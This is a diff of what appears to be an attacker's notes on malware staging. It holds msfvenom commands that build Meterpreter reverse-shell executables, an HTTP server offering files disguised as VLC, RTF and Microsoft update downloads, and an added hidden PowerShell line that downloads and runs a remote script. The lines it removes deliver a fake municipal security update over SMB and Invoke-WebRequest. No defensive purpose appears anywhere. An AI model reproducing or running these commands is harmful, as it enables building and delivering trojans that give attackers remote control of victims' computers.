@@ -10,7 +10,6 @@ msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f p
 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f exe > trojan.exe
 
-
 python3 -m http.server 8080
 
 http://192.168.1.137:8080/vlc_infectado.exe
@@ -19,22 +18,8 @@ http://192.168.1.137:8080/documento_infectado.rtf
 
 http://192.168.1.137:8080/microsoft_update.page.zip
 
-sudo cp -r /caminho/para/conectasocial_advanced /var/www/html/
+powershell -w hidden -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.137/payload.ps1')"
 
-sudo apt update
-sudo apt install apache2 php libapache2-mod-php -y
-sudo systemctl restart apache2
-
-sudo impacket-smbserver share $(pwd) -smb2support
-
-\\192.168.1.137\share\Atualizacao_Seguranca_Prefeitura_2021.exe
-
-net use Z: \\192.168.1.137\share
-Z:\Atualizacao_Seguranca_Prefeitura_2021.exe
-
-
-
-Invoke-WebRequest -Uri "http://192.168.1.137/Atualizacao_Seguranca_Prefeitura_2021.exe" -OutFile "Atualizacao_Seguranca_Prefeitura_2021.exe"
 
 
  
